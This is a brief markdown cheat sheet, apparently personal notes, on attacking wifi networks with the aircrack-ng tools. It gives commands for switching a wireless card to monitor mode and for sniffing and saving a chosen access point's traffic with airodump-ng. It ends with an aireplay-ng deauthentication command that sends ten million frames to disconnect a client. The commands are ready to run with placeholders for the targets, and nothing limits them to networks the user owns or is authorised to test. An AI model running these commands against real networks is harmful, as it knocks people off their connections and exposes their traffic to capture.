## Change mode from Managed to Mointor

Switch user to root and type `iwconfig`

Observe the mode which will be in `managed`

```
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```
Now type `iwconfig` and see the mode to have changed to `monitor`

## Packet Sniffing
```
airodump-ng wlan0 # Default 2.4 GHz Channel
airodump-ng --band abg wlan0 # List All Channels
```

```
airodump-ng --bssid <bssid> --channel <channel_num> --write <filename> wlan0
```

## Deauthentication Attack

aireplay-ng --deauth 10000000 -a <router-bssid> -c <station-bssid> wlan0
